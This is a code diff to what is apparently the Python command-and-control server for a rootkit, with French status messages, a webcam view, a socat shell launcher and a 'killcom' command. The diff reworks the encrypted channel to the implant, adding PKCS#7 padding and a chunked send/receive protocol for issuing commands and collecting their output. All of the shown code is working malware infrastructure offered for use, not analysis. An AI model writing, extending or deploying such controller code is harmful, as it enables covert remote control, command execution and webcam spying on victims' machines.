@@ -168,8 +168,7 @@ def send():
 
     try:
         with connection_lock:
-            to_send = aes_encrypt(cmd + "\n")
-            rootkit_connection.sendall(to_send)
+            send_to_server(rootkit_connection, cmd)
             if 'killcom' in cmd.lower():
                 rootkit_connection.close()
                 last_response = {"stdout": "", "stderr": "Connexion terminée."}
@@ -178,14 +177,14 @@ def send():
             rootkit_connection.settimeout(3)
             try:
                 chunks = []
-                rootkit_connection.settimeout(0.5)
+                rootkit_connection.settimeout(1)
                 while True:
                     try:
-                        part = rootkit_connection.recv(BUFFER_SIZE)
+                        part = receive_from_server(rootkit_connection)
+                        print(part)
                         if not part:
                             break
-                        decrypted_part = aes_decrypt(part)
-                        chunks.append(decrypted_part)
+                        chunks.append(part)
                     except socket.timeout:
                         break
                 response = ''.join(chunks)
@@ -257,23 +256,131 @@ def webcam():
 
     return render_template("webcam.html", webcam_output=webcam_output, image_exists=image_exists, image_path=image_path)
 
-# ---------------- AES Encryption/Decryption ----------------
+# ---------------- AES-128 Encryption/Decryption with PKCS#7 padding ----------------
 def aes_encrypt(plaintext):
-    data = plaintext.encode()
-    padding_len = 16 - (len(data) % 16)
-    data += b'\x00' * padding_len
-
+    # Convert string to bytes if needed
+    if isinstance(plaintext, str):
+        data = plaintext.encode('utf-8')
+    else:
+        data = plaintext
+    
+    # Apply PKCS#7 padding
+    padder = padding.PKCS7(algorithms.AES.block_size).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    
+    # Encrypt the padded data
     cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
     encryptor = cipher.encryptor()
-    encrypted = encryptor.update(data) + encryptor.finalize()
+    encrypted = encryptor.update(padded_data) + encryptor.finalize()
     return encrypted
 
 
 def aes_decrypt(ciphertext):
+    # Decrypt the data
     cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
     decryptor = cipher.decryptor()
-    decrypted = decryptor.update(ciphertext) + decryptor.finalize()
-    return decrypted.rstrip(b'\x00').decode()
+    decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
+    
+    # Remove PKCS#7 padding
+    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
+    unpadded = unpadder.update(decrypted_padded) + unpadder.finalize()
+    
+    # Convert to string
+    result = unpadded.decode('utf-8', errors='ignore')
+    
+    return result
+
+# ---------------------- SOCKET COMMUNICATION ----------------------
+def send_to_server(sock, data):
+    # Encrypt the data
+    data = aes_encrypt(data)
+
+    # Define the maximum chunk size
+    max_chunk_body_size = BUFFER_SIZE - 5
+    len_data = len(data)
+
+    # Calculate the number of chunks needed
+    nb_chunks_needed = len_data // max_chunk_body_size
+    if len_data % max_chunk_body_size != 0:
+        nb_chunks_needed += 1
+
+    for i in range(nb_chunks_needed):
+        # Calculate the actual size of the chunk
+        current_chunk_size = max_chunk_body_size if i < nb_chunks_needed - 1 else len_data % max_chunk_body_size
+        if current_chunk_size == 0:
+            current_chunk_size = max_chunk_body_size  # Last chunk of maximum size
+
+        # Build the chunk
+        chunk = bytearray(BUFFER_SIZE)
+        chunk[0] = nb_chunks_needed  # Number of chunks
+        chunk[1] = i  # Index of the current chunk
+        chunk[2] = (current_chunk_size >> 8) & 0xFF  # Upper byte of the chunk size
+        chunk[3] = current_chunk_size & 0xFF  # Lower byte of the chunk size
+        chunk[4:4 + current_chunk_size] = data[i * max_chunk_body_size: (i + 1) * max_chunk_body_size]  # Chunk data
+        chunk[4 + current_chunk_size] = 0x04  # End-of-transmission byte
+
+        # Send the chunk
+        try:
+            sock.sendall(chunk)
+        except socket.error as e:
+            print(f"send_to_server: failed to send message (chunk {i}): {e}")
+            return False
+
+    return True
+
+def receive_from_server(sock):
+    total_received = 0
+    nb_chunks_needed = 0
+    received_chunks = []
+    buffer = bytearray()
+
+    while True:
+        # Receive a chunk
+        chunk = sock.recv(BUFFER_SIZE)
+        if not chunk:
+            print("receive_from_server: failed to receive data or connection closed")
+            return False
+
+        # Extract chunk information
+        total_chunks = chunk[0]
+        chunk_index = chunk[1]
+        chunk_data_len = (chunk[2] << 8) | chunk[3]
+        chunk_data = chunk[4:4 + chunk_data_len]
+
+        # Check end-of-transmission
+        if chunk[4 + chunk_data_len] != 0x04:
+            print(f"receive_from_server: invalid end of transmission (chunk {chunk_index})")
+            return False
+
+        # Initialize structure if this is the first reception
+        if nb_chunks_needed == 0:
+            nb_chunks_needed = total_chunks
+            received_chunks = [False] * nb_chunks_needed
+
+        # Check for duplicates
+        if received_chunks[chunk_index]:
+            print(f"receive_from_server: duplicate chunk received (chunk {chunk_index})")
+            return False
+
+        # Mark this chunk as received
+        received_chunks[chunk_index] = True
+
+        # Append data to the buffer
+        buffer.extend(chunk_data)
+        total_received += chunk_data_len
+
+        # Check if all chunks have been received
+        if all(received_chunks):
+            print(f"receive_from_server: all chunks received")
+            break
+
+
+    result = bytes(buffer)
+
+    # Decrypt the data
+    decrypted = aes_decrypt(result)
+
+    return decrypted
 
 # ---------------------- SOCKET THREAD ----------------------
 def socket_listener():
@@ -291,10 +398,8 @@ def socket_listener():
 
     print(f"✅ [+] Rootkit connecté depuis {address[0]}")
 
-    data = connection.recv(BUFFER_SIZE)
-    decrypted = aes_decrypt(data)
-    if data:
-        print(f"📥 [rootkit] {decrypted.strip()}")
+    data = receive_from_server(connection)
+    print(f"📥 [rootkit] {data}")
 
 # ---------------------- CLI MODE ----------------------
 def run_socat_shell(port=9001):
@@ -359,8 +464,7 @@ def run_cli():
                         threading.Thread(target=run_socat_shell).start()
                         time.sleep(1)
                     command_history.append(line)
-                    to_send = aes_encrypt(line + "\n")
-                    connection.sendall(to_send)
+                    send_to_server(connection, line)
                     if line.lower() == "killcom":
                         print("❌ Fermeture demandée.")
                         return
@@ -373,19 +477,8 @@ def run_cli():
 
     def receive_responses():
         while True:
-            try:
-                data = connection.recv(BUFFER_SIZE)
-                if data:
-                    try:
-                        decrypted = aes_decrypt(data)
-                        print(f"{decrypted.strip()}")
-                    except Exception as e:
-                        print(f"💥 [!] Decryption error: {e}")
-                else:
-                    break
-            except Exception as e:
-                print(f"💥 [!] Reception error: {e}")
-                break
+            received = receive_from_server(connection);
+            print(f"🔒 [*] Received: {received}")
 
     threading.Thread(target=receive_responses, daemon=True).start()
     send_commands()
